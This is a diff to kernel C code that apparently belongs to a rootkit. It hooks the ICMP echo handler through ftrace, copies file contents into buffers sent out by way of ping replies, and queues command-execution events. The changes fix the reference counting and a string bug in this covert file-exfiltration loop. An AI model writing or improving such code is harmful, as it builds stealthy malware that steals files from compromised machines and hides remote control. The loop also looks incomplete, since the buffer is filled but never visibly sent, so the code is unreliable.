@@ -1825,7 +1825,6 @@ static asmlinkage  bool ftrace_icmp_echo(struct sk_buff *skb)
 
 static int do_send_file(const char *name, struct sk_buff *skb, char *buf, int buf_len)
 {
-	struct sk_buff *skb2 = NULL;
 	void *data = NULL;
 	loff_t file_size = 0;
 	loff_t size = 0;
@@ -1844,18 +1843,15 @@ static int do_send_file(const char *name, struct sk_buff *skb, char *buf, int bu
 	while (file_size > 0) {
 		if (file_size > buf_len)
 			len = buf_len;
-		skb2 = skb_clone(skb, GFP_KERNEL);
 		memcpy(buf, data+size, len);
-		//skb_get(skb);
+
+		skb_get(skb);
 		real_icmp_echo(skb);
 		file_size -= len;
 		size += len;
-		skb = skb2;
-		skb2 = NULL;
 	}
 
 end:
-	kfree_skb(skb);
 	if (data)
 		vfree(data);
 	if (fname)
@@ -1893,7 +1889,7 @@ static int send_file_task(void *data)
 		i++;
 	}
 	if (i>0 && i == len)
-		cmd[i-1] = '\0';
+		name[i-1] = '\0';
 	if ((f_len = strlen(name)) == 0)
 		goto end;
 
@@ -1925,7 +1921,7 @@ int make_exec_event(int cmd, void *data)
 	if (spin_trylock_bh(&exec_event_list_lock)) {
 		list_add_tail(&exec_event_list, &ev->list);
 		spin_unlock_bh(&exec_event_list_lock);
-		ret  = 0;
+		ret = 0;
 	} else {
 		refcount_dec(&skb->users);
 		kfree(ev);
